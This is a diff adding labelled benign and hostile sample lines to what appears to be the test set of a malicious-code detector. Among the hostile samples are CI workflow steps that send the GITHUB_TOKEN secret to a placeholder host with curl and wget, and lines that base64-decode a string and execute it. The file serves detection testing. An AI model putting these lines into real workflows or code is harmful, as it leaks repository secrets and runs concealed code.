@@ -317,6 +317,9 @@ BROAD_BENIGN = [
     ("h_xor", "lib/r.js", "function xorshift32(s) { s ^= s << 13; return s; }"),
     ("h_xor", "lib/r.js", "const rng = new Xoroshiro128Plus(seed);"),
     ("h_xor", "lib/h.js", "for (i = 0; i < s.length; i++) h = (h << 5) ^ s.charCodeAt(i);"),
+    ("h_xor", "lib/h.js", "for (i = 0; i < s.length; i++) h ^= s.charCodeAt(i);"),
+    ("h_decode_exec", "x.py", "data = base64.b64decode(blob)\nplan = executemany(rows)"),
+    ("h_credential", ".github/workflows/ci.yml", "        run: curl -sSf https://example.invalid/install.sh\n          token: ${{ secrets.GITHUB_TOKEN }}"),
     ("h_encoded_import", "lib/e.js", "const base64 = require(\"base64-js\");"),
     ("h_encoded_import", "lib/e.js", "const { Base64 } = require('js-base64');"),
     ("h_encoded_import", "lib/e.js", "const atob = require('atob');"),
@@ -339,6 +342,15 @@ BROAD_HOSTILE = [
     ("h_encoded_import", "lib/e.js", "require(Buffer.from(n, 'base64').toString())"),
     ("h_encoded_import", "lib/e.js", "import(atob(n))"),
     ("h_encoded_import", "lib/e.js", "require('base64-js' + suffix)"),
+    # Round-2 review: exec variants, token exfil in a workflow, reversed and nested XOR.
+    ("h_decode_exec", "lib/a.js", "child_process.execFile(Buffer.from(s, 'base64').toString())"),
+    ("h_decode_exec", "lib/a.js", "cp.execFileSync(atob(s))"),
+    ("h_decode_exec", "x.py", "os.execve(base64.b64decode(blob), [], {})"),
+    ("h_decode_exec", "x.py", "os.execvp(base64.b64decode(blob).decode(), [])"),
+    ("h_credential", ".github/workflows/ci.yml", '        run: curl -d "${{ secrets.GITHUB_TOKEN }}" https://example.invalid'),
+    ("h_credential", ".github/workflows/ci.yml", "        run: wget --post-data=${{ secrets.GITHUB_TOKEN }} https://example.invalid"),
+    ("h_xor", "lib/x.js", "out.push(k ^ s.charCodeAt(i));"),
+    ("h_xor", "lib/x.js", "out.push(key.charCodeAt(i % (key.length)) ^ 7);"),
 ]
 
 
